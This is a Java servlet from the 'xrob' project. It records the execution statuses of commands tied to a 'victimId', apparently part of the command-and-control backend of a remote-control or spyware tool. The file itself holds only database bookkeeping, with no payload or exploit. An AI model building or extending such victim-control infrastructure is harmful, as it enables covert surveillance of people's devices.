package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.command.CommandStatuses;
import com.theah64.xrob.api.database.tables.command.Commands;
import com.theah64.xrob.api.models.Command;
import com.theah64.xrob.api.utils.APIResponse;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.servlet.annotation.WebServlet;

/**
 * Created by theapache64 on 15/9/16,9:32 PM.
 */
@WebServlet(urlPatterns = AdvancedBaseServlet.VERSION_CODE + "/command/status/add")
public class CommandStatusAddServlet extends AdvancedBaseServlet {


    @Override
    protected boolean isSecureServlet() {
        return true;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{KEY_DATA};
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String victimId = getHeaderSecurity().getVictimId();

        final JSONArray jaCommandStatuses = new JSONArray(getStringParameter(KEY_DATA));

        final CommandStatuses cStatuesTable = CommandStatuses.getInstance();

        for (int i = 0; i < jaCommandStatuses.length(); i++) {

            final JSONObject joCommandStatus = jaCommandStatuses.getJSONObject(i);

            final String commandId = joCommandStatus.getString(CommandStatuses.COLUMN_COMMAND_ID);
            //is command exist
            final boolean isCommandExistAndEstablishedForThisVictim = Commands.getInstance().isExist(Commands.COLUMN_ID, commandId, Commands.COLUMN_VICTIM_ID, victimId);

            if (isCommandExistAndEstablishedForThisVictim) {

                final String status = joCommandStatus.getString(CommandStatuses.COLUMN_STATUS);

                if (Command.Status.isValid(status)) {

                    final boolean isStatusAlreadyExists = cStatuesTable.isExist(CommandStatuses.COLUMN_COMMAND_ID, commandId, CommandStatuses.COLUMN_STATUS, status);

                    final boolean isStatusAdded = isStatusAlreadyExists || cStatuesTable.add(new Command.Status(
                            status,
                            joCommandStatus.getString(CommandStatuses.COLUMN_STATUS_MESSAGE),
                            0,
                            commandId
                    ));

                    if (!isStatusAdded) {
                        throw new IllegalArgumentException("Failed to add command status");
                    }

                } else {
                    throw new IllegalArgumentException("Invalid status : " + status);
                }


            } else {
                throw new IllegalArgumentException("Command doesn't exist or not established for you");
            }
        }

        //Every thing's ok.
        getWriter().write(new APIResponse("Status added", null).toString());
    }
}
